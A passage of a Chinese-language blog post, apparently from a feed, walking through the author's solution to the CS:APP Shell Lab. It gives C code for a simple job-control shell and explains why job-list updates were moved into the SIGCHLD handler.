punctuation">;</span><span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>job<span class="token operator">-></span>pid<span class="token punctuation">,</span> SIGCONT<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>最后，对于前台运行而言，父进程需要调用 <code>waitfg</code> 进行等待；对于后台运行而言，打印作业信息（具体格式见 <code>tshref.out</code> 的内容）。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>state <span class="token operator">==</span> FG<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">waitfg</span><span class="token punctuation">(</span>job<span class="token operator">-></span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d)"</span><span class="token punctuation">,</span> job<span class="token operator">-></span>jid<span class="token punctuation">,</span> job<span class="token operator">-></span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" %s"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="信号处理函数"><a href="#信号处理函数" class="headerlink" title="信号处理函数"></a>信号处理函数</h2><p>这部分看似简单，实则很容易出错，值得仔细说说。</p><p>最开始，我在 <code>sigint_handler</code> 和 <code>sigtstp_handler</code> 中进行了对作业队列的操作，在 <code>sigint_handler</code> 中使用 <code>deletejob</code> 删除作业，在 <code>sigtstp_handler</code> 中将作业状态修改为 <code>ST</code>。</p><p>这在前面的测试用例中工作一切正常，但在最后的 trace16 中，程序却阻塞在了 <code>mystop.c</code> 的 <code>if (kill(-pid, SIGTSTP) &lt; 0)</code> 位置，而如果按下键盘的 ctrl-c 或 ctrl-z 却能够响应信号，程序也正常终止或暂停。</p><p>通过查阅网上资料，在 <a href="https://zhuanlan.zhihu.com/p/593070389">实验四：Shell-Lab（下） - 知乎</a> 找到了问题的原因。</p><p>程序 <code>mystop</code> 使用 <code>kill</code> 发送信号时，信号是直接发送到内核进行处理的，而不会经过 shell，shell 也就不会调用 <code>sigtstp_handler</code> 将作业状态更改为 <code>ST</code>，shell 因此认为 <code>mystop</code> 程序一直处于前台运行状态，也就保持阻塞。</p><p>既然 <code>sigint_handler</code> 和 <code>sigtstp_handler</code> 在这种情况下无法被调用，那么就需要在其他信号处理函数中进行处理，答案便是 <code>sigchld_handler</code>。事实上，子进程并非只有在终止时才向父进程发送 SIGCHLD 信号，而是在状态发生改变后就会。我们可以利用这一点，将所有对作业队列的操作都放到 <code>sigchld_handler</code> 中，而 <code>sigint_handler</code> 和 <code>sigtstp_handler</code> 只作一个转发作用。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sigchld_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">waitpid</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> WNOHANG <span class="token operator">|</span> WUNTRACED<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFEXITED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token comment">// 子进程正常退出</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFSTOPPED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token comment">// 子进程暂停</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFSIGNALED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 子进程终止</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmdline<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> bg<span class="token punctuation">;</span>    <span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span>MAXARGS<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token class-name">sigset_t</span> mask_all<span class="token punctuation">,</span> mask_one<span class="token punctuation">,</span> prev_one<span class="token punctuation">;</span>  <span class="token comment">// 用于父-子进程同步</span>        <span class="token function">sigfillset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_all<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sigemptyset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_one<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sigaddset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_one<span class="token punctuation">,</span> SIGCHLD<span class="token punctuation">)</span><span class="token punctuation">;</span>    bg <span class="token operator">=</span> <span class="token function">parseline</span><span class="token punctuation">(</span>cmdline<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">builtin_cmd</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">access</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> X_OK<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: Command not found\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask_one<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setpgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 将进程组设置为自己的 pid</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">execve</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> environ<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execve %s error\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask_all<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>bg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> BG<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d) %s"</span><span class="token punctuation">,</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token operator">-></span>jid<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> FG<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">waitfg</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="built-cmd"><a href="#built-cmd" class="headerlink" title="built_cmd"></a>built_cmd</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">builtin_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"quit"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"jobs"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">listjobs</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"bg"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">do_bgfg</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span> BG<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"fg"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">do_bgfg</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span> FG<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// 根据字符串 arg（格式为 %jid 或 pid）获取对应的 job</span><span class="token comment">// 成功返回 job 指针，失败返回 NULL</span><span class="token keyword">struct</span> <span class="token class-name">job_t</span> <span class="token operator">*</span><span class="token function">getjob_arg</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> isjid<span class="token punctuation">,</span> id<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>parg<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">job_t</span> <span class="token operator">*</span>job<span class="token punctuation">;</span>    isjid <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'%'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        isjid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token operator">++</span>arg<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    parg <span class="token operator">=</span> arg<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>parg <span class="token operator">!=</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isdigit</span><span class="token punctuation">(</span><span class="token operator">*</span>parg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bg/fg: argument must be a PID or %%jobid\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">++</span>parg<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    id <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>isjid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        job <span class="token operator">=</span> <span class="token function">getjobjid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>job <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"(%s): No such process\n"</span><span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        job <span class="token operator">=</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>job <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: No such job\n"</span><span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> job<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 与题目提供的接口有些不同（加了个 state 参数），感觉这样更好处理一些...</span><span class="token keyword">void</span> <span class="token function">do_bgfg</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">int</span> state<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">sigset_t</span> mask_all<span class="token punctuation">,</span> prev_one<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">job_t</span> <span class="token operator">*</span>job<span class="token punctuation">;</span>    <span class="token function">sigfillset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_all<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fg command requires PID or %%jobid argument\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    job <span class="token operator">=</span> <span class="token function">getjob_arg</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>job <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask_all<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">)</span><span class="token punctuation">;</span>    job<span class="token operator">-></span>state <span class="token operator">=</span> state<span class="token punctuation">;</span>    <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>job<span class="token operator">-></span>pid<span class="token punctuation">,</span> SIGCONT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>state <span class="token operator">==</span> FG<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">waitfg</span><span class="token punctuation">(</span>job<span class="token operator">-></span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d)"</span><span class="token punctuation">,</span> job<span class="token operator">-></span>jid<span class="token punctuation">,</span> job<span class="token operator">-></span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" %s"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">waitfg</span><span class="token punctuation">(</span><span class="token class-name">pid_t</span> pid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">struct</span> <span class="token class-name">job_t</span> <span class="token operator">*</span>job <span class="token operator">=</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>job <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> job<span class="token operator">-></span>state <span class="token operator">!=</span> FG<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sigchld_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span>    <span class="token keyword">int</span> status<span class="token punctuation">;</span>    <span class="token class-name">sigset_t</span> mask_all<span class="token punctuation">,</span> prev_one<span class="token punctuation">;</span>        <span class="token function">sigfillset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_all<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">waitpid</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> WNOHANG <span class="token operator">|</span> WUNTRACED<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask_all<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFEXITED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">deletejob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFSTOPPED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Job [%d] (%d) stopped by signal 20\n"</span><span class="token punctuation">,</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span> <span class="token operator">-></span> state <span class="token operator">=</span> ST<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFSIGNALED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Job [%d] (%d) terminated by signal 2\n"</span><span class="token punctuation">,</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">deletejob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="sigint-handler"><a href="#sigint-handler" class="headerlink" title="sigint_handler"></a>sigint_handler</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sigint_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">pid_t</span> pid <span class="token operator">=</span> <span class="token function">fgpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>pid<span class="token punctuation">,</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="sigtstp-handler"><a href="#sigtstp-handler" class="headerlink" title="sigtstp_handler"></a>sigtstp_handler</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sigtstp_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">pid_t</span> pid <span class="token operator">=</span> <span class="token function">fgpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>pid<span class="token punctuation">,</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;本 Lab 需要实现一个简易的 shell，主要考察对进程和信号的理解，以及对与其相关的 POSIX API 的使用，对应知识点为书中的第 8 章内容。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
